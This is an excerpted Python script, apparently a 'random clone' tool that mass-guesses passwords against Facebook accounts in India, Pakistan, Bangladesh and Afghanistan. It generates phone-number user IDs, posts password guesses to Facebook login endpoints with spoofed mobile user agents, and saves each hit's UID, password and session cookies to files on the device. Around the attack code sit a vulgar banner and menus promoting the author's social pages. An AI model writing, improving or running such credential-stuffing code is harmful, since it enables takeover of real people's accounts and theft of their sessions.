# CREATED by SAMI KHAN
#KAR LIYA DECODE TERI BHAN KO NAMAN KAR KE CHODU 
...
$$ |  $$ |$$ |  $$ |$$ |      $$ |         $$ |    
$$$$$$$  |$$ |  $$ |$$ |      $$ |         $$ |    
\_______/ \__|  \__|\__|      \__|         \__|    BAPPY BRAND 😈

\033[1;37m--------------------------------------------------
\033[1;37m[•] AUTHOR     : \033[1;32mBAPPY VAU\033[1;37m
\033[1;37m[•] GITHUB     : \033[1;32mBAPPY KING\033[1;37m
...
def my_tool_security():
    ...
    print(47*"-")
    print(c, 45*"-",)
    print("\t  Facebook : SAMI KHAN ")
    print("\t  Fb page  : SAMI COMMUNITY ")
    print("\t  Github   : SAMI-JANI")
    print(c, 45*"-")
    print(47*"-")
    try:
    ...
    if f_token in my_server:
        ...
        _help=uuid.uuid1().hex[:6].upper()+"=SAMI"
        print("\n\t     [ Hello User ]\n")
...
def menu_apikey():
    ...
    print(f"\033[1;32m[1]RANDOM CLONE")
    print(f"\033[1;33m[2]OWNER FB ID")
    print(f"\033[1;34m[3]OWNER FB GRUP")
    print(f"\033[1;35m[0]EXIT PROGRAM ")
    print(f"\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━•×•")
    hamii = input("🌺CHOOSE : ")
    if hamii in ["1","01"]:
        ...
        os.system("xdg-open https://www.facebook.com/profile.php?id=61554689163346");xyz()
    elif hamii in ["3","03"]:
        os.system("xdg-open https://facebook.com/groups/872469647884782/")
        xyz()    
    elif hamii in ["0","00"]:
       exit()
    else:
...
def password():
    ...
    print(f"")
    print(f"\033[1;32m[1] INDIA RANDOM CLONING  ")
    print(f"\033[1;36m[2] PAKISTAN RANDOM CLONING ")
    print(f"\033[1;33m[3] BANGLADESH RANDOM CLONING ")
    print(f"\033[1;35m[4] AFGANISTAN RANDOM CLONING ")
    print(f"\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━•×•")
    print("")
    passX = input(f" \033[1;37m[•]CHOOSE{hamii2} : ")
    if passX in ['1','01']:
        os.system("xdg-open https://youtube.com/@SAMI-yt-chenal-786?si=MUGNNZw-2hv_sOSn")


        password1()
    elif passX in ['2','02']:
        os.system("xdg-open https://www.youtube.com/@Brekon-SAMI-1.M")
...
def password1():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        tl = str(len(user))
        print(f"\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━•×•")
        print(f"\033[1;32m[•]TOTAL IDZ             : "+tl+" ")
        print(f"\033[1;35m[•]COUNTRY YOU CHOOSE    : INDIA")
        print(f"\033[1;37m[•]SIM CODE        : "+code)
        print(f"\033[1;36m[•]TODAY DATE & TIME     :{ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print(f"\033[1;32m[•]TO STOP PROCESS PRESS Ctrl + Z ")
        print(f"\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━•×•")
        for guru in user:
            uid = code+guru
...
def free1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r\33[1;37m[SAMI] [%s] \33[1;97m[OK:%s{SRABON}CP:%s]'%(loop,len(ok),len(cp))), 
            sys.stdout.flush()
            ...
            'user-agent': '[FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G532G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]',}
            lo = session.post('https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header).text
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/SAMI-OK.txt', 'a').write(uid+'|'+ps+'|'+coki+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print('\r\033[1;34m[SAMI] '+uid+' [~] '+ps+' ')
                    open('/sdcard/SAMI.txt', 'a').write(uid+' | '+ps+'|'+coki+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    Red = '\033[1;31m'
                    print(f'\r\033[1;35m[BAPPY-CP] '+uid+' |'+ps+ ' ')
...
def password2():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        print(f"\033[1;37m[•]COUNTRY YOU CHOOSE    : ] PAKISTHAN")
        print(f"\033[1;37m[•]NUMBER YOU PUT        : "+code)
        print(f"\033[1;37m[•]TODAY DATE & TIME     :{ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print(f"\033[1;37m[•]TO STOP PROCESS PRESS Ctrl + Z ")
        print(f"\033[1;31m[•]==============================================")
        for love in user:
                    uid = code+love
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    uid=coki[141:156]
                    Red = '\033[1;31m'
                    print(f'\r\033[1;35m[SAMI-CP] '+uid+' |'+ps+ ' ')
                    open('/sdcard/SAMI-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
...
def password5():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        tl = str(len(user))
        print(f"\033[1;37m[•]TOTAL IDZ             : "+tl+" ")
        print(f"\033[1;37m[•]COUNTRY YOU CHOOSE    : ] BANGLADESH")
        print(f"\033[1;37m[•]NUMBER YOU PUT        : "+code)
        print(f"\033[1;37m[•]TODAY DATE & TIME     :{ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print(f"\033[1;37m[•]TO STOP PROCESS PRESS Ctrl + Z ")
        print(f"\033[1;31m[•]==============================================")
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    uid=coki[141:156]
                    print('\r\033[1;34m[SAMI] '+uid+' [~] '+ps+' ')
                    open('/sdcard/SAMI.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
...
def password6():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        tl = str(len(user))
        print(f"\033[1;37m[•]TOTAL IDZ             : "+tl+" ")
        print(f"\033[1;37m[•]COUNTRY YOU CHOOSE    : ] AFGHANISTAN")
        print(f"\033[1;37m[•]NUMBER YOU PUT        : "+code)
        print(f"\033[1;37m[•]TODAY DATE & TIME     :{ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print(f"\033[1;37m[•]TO STOP PROCESS PRESS Ctrl + Z ")
        print(f"\033[1;31m[•]==============================================")
...
def free1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            sys.stdout.write(f'\r\33[1;37m[SAMI] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
            sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            ...
            if 'c_user' in log_cookies:
                ...
                xd=xx[:15]
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•SAMI-OK☺️]  ')
                print(f'\033[1;92m[FACEBOOK]… [UID]{xd}  ')
                print(f'\033[1;92m[ PASSWORD ] … [🔑]{ps}  ')
                print(f'\033[1;92m[JOIN DATE ] …[📅 ] {Joined(xd)}  ')
                print(f'\033[1;37m==========================================================')              
                print(f'\033[1;92m[COOKIES]…[ 🍪 ] {coki}  ')
                print(f'\033[1;37m==========================================================')
    
                open('/sdcard/SAMI-OK.txt', 'a').write(xd+'|'+ps+'|'+coki+'\n')
                open('/sdcard/SAMI-AGENT.txt', 'a').write(pro+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
